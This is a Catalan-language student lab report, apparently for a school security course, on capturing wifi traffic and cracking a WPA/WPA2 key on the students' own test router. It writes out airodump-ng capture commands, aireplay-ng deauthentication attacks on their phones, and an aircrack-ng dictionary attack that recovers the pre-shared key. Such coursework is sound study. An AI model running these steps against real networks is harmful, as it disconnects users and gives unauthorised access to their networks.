<!-----
title: "Xarxes sense fil i captura de trànsit per realitzar atacs"
author: "Toni Peraira"
date: "2021-11-25"
version: "1.0"
geometry: left=2.54cm,right=2.54cm,top=2.54cm,bottom=2.54cm
header-right: '\headerlogo'
header-includes:
- '`\newcommand{\headerlogo}{\raisebox{0pt}[0pt]{\includegraphics[width=3cm]{../institut_montilivi.png}}}`{=latex}'
---

pandoc README.md -o Toni_Peraira_RA2_2.3.pdf --from markdown --template eisvogel --listings --pdf-engine=xelatex --toc -s -V toc-title:"Índex"
-->

Detecta xarxes sense fils i captura tràfic de xarxa com a pas previ al seu atac.

# Índex <!-- omit in toc -->
- [Llista eines que ens puguin servir per detectar xarxes wifi i capturar paquets sense estar autenticat a la xarxa.](#llista-eines-que-ens-puguin-servir-per-detectar-xarxes-wifi-i-capturar-paquets-sense-estar-autenticat-a-la-xarxa)
- [Llista les diferents xarxes wifi que es troben al nostre voltant, mostra informació sobre: bssid, beacons, #Data, ESSID, canal i encriptació (airodump).](#llista-les-diferents-xarxes-wifi-que-es-troben-al-nostre-voltant-mostra-informació-sobre-bssid-beacons-data-essid-canal-i-encriptació-airodump)
- [Escull una eina que ens permeti capturar el transit wifi.](#escull-una-eina-que-ens-permeti-capturar-el-transit-wifi)
- [Què és el handshake WPA/WPA2 en una autenticació wifi?](#què-és-el-handshake-wpawpa2-en-una-autenticació-wifi)
- [Què és una clau pre-compartida en una autenticació wifi.](#què-és-una-clau-pre-compartida-en-una-autenticació-wifi)
- [Provoca el hanshake WPA/WPA2 i captura'l.](#provoca-el-hanshake-wpawpa2-i-captural)
- [Bibliografia](#bibliografia)

## Llista eines que ens puguin servir per detectar xarxes wifi i capturar paquets sense estar autenticat a la xarxa.

* [Wireshark](https://www.wireshark.org/)
* [Airodump-ng (Aircrack-ng)](https://www.aircrack-ng.org/)
* [TCPdump](https://www.tcpdump.org/)
* [Ettercap](https://www.ettercap-project.org/)
* [SolarWinds Network Performance Monitor](https://www.solarwinds.com/es/network-performance-monitor)
* [Paessler Packet Capture](https://www.paessler.com/)
* [Acrylic WiFi Professional](https://www.acrylicwifi.com/)
* [Kismet](https://www.kismetwireless.net/)

## Llista les diferents xarxes wifi que es troben al nostre voltant, mostra informació sobre: bssid, beacons, #Data, ESSID, canal i encriptació (airodump).

Per tal de llistar les diferents xarxes, copiaré la comprovació de la interfície de xarxa del RA2_2.1 on ja vaig fer-ho.


```
sudo airmon-ng start wlp14s0
```
!["airmon-ng start wlp14s0"](../RA2_2.1/images/image02.png "airmon-ng start wlp14s0")

```
sudo airmon-ng check kill
sudo airodump-ng wlp14s0mon
```

!["Llista de les xarxes Wi-fi"](../RA2_2.1/images/image03.png "Llista de les xarxes Wi-fi")

## Escull una eina que ens permeti capturar el transit wifi.

Capturarem el transit Wi-Fi amb Airodump-ng (Aircrack-ng) per fer desxifrar .

## Què és el handshake WPA/WPA2 en una autenticació wifi?

El handshake, en castellà "*apretón de manos*", és un acord entre un dispositiu client i un punt d'accés (AP) per preestablir una connexió; és el moment en què es posen d'acord aquests dos elements per comunicar-se entre ells.

Quan parlem de handshake WPA/WPA2 en una autenticació Wi-fi, ens referim a l'establiment d'aquesta comunicació en xarxes xifrades amb WPA i WPA2 perquè el client es pugui connectar a la xarxa.

Abans que un client es pugui connectar a una xarxa Wi-fi, aquest ha d'intercanviar informació amb l'AP per establir els protocols que permeten enllaçar la comunicació. Quan s'enllaça aquesta comunicació és quan es realitza la connexió.

## Què és una clau pre-compartida en una autenticació wifi.

Una clau precompartida, PSK (pre-shared key), és una clau secreta que comparteixen el client i el AP abans de fer-se la connexió i que s'envia xifrada per un canal segur.

Amb aquesta clau precompartida es desxifra la comunicació entre els dos punts.

És com quan dues persones creen una clau secreta que serveix per desxifrar el contingut d'un text. Un cop tenen la clau precompartida es poden enviar textos que únicament poden ser llegibles si tens la clau per desxifrar-ho.

En una autenticació Wi-Fi, la clau precompartida serveix perquè els clients es puguin autenticar a la xarxa sense fils.

## Provoca el hanshake WPA/WPA2 i captura'l.

L'objectiu serà capturar el handshake WPA/WPA2 i fer servir aircrack-ng per obtenir la clau pre-compartida. 

Amb la interfície de xarxa en mode monitor busquem quin serà l'objectiu, serà la xarxa **Linksys02848**, que pertany al router de proves.

!["Detalls de les xarxes"](images/image01.png "Detalls de les xarxes")

---

Iniciem l'airodump-ng per capturar el handshake en el moment que un dispositiu s'autentiqui.

```console
sudo airodump-ng -c 1 --bssid E8:9F:80:1C:3A:19 --write ~/aircrack/poc --output-format pcap wlp14s0mon
```
* -c 1: Canal de la xarxa Wi-Fi.
* --bssid E8:9F:80:1C:3A:19: Adreça MAC de l'AP (Punt d'accés). Per fer servir únicament el trànsit d'aquesta xarxa.
* --write ~/aircrack/poc: Escriurem sobre aquest fitxer on es guardaran els IV (Initialization Vector), bloc de bits. La informació dels paquets capturats.
* --output-format pcap
* wlp14s0mon: El nom de la interfície de xarxa.

![](images/image02.png)

En Joel i jo ens hem connectat amb els mòbils a la xarxa Wi-fi, això ha provocat que apareguin dos elements a la llista.

!["Connexions a la xarxa"](images/image03.png "Connexions a la xarxa")

Les MAC dels nostres mòbils:

* 3E:34:09:F3:44:8D 
* 8A:2A:C4:33:33:9D

---

Llancem un atac de desautenticació, això envia un missatge al client per desassociar-lo de l'AP. 

Ho fem per accelerar el procés de capturar el handshake. Aquesta acció obligarà al client a reautenticar-se, la qual cosa genera els 4 paquets d'autenticació (handshake) que volem capturar.

```console
sudo aireplay-ng -0 10 -a E8:9F:80:1C:3A:19 -c 3E:34:09:F3:44:8D wlp14s0mon

sudo aireplay-ng -0 10 -a E8:9F:80:1C:3A:19 -c 8A:2A:C4:33:33:9D wlp14s0mon
```

* 0: Deautenticació.
* 1: Número de deautenticacions a enviar.
* -a E8:9F:80:1C:3A:19: adreça MAC de l'AP.
* -c 3E:34:09:F3:44:8D & 8A:2A:C4:33:33:9D: Adreça MAC del client a deautenticar.
* wlp14s0mon: El nom de la interfície de xarxa.

!["Connexions a la xarxa"](images/aireplay.png "Connexions a la xarxa")

Aquest atac ha provocat que els nostres dispositius es desconnectin, ens hem tornat a connectar.

---

Intentem trobar la clau WPA/WPA2 precompartida. Farem un diccionari amb possibles claus, on hem afegit manualment la clau de la xarxa.

```console
aircrack-ng -w password.lst -b E8:9F:80:1C:3A:19 *.cap
```

* -w password.lst: Diccionari amb les possibles claus.
* *.cap: Grupo d'arxius que contenen els paquets capturats, tots aquells que acabin per .cap.

!["Password trobat"](images/password.png "Password trobat")

ET VOILÀ! Hem aconseguit la clau precompartida: *c0tjyrtsfm*.

## Bibliografia

https://www.aircrack-ng.org/doku.php?id=es:cracking_wpa

https://conectabell.com/descifrando-redes-wpa2/

https://es.wikipedia.org/wiki/Vector_de_inicializaci%C3%B3n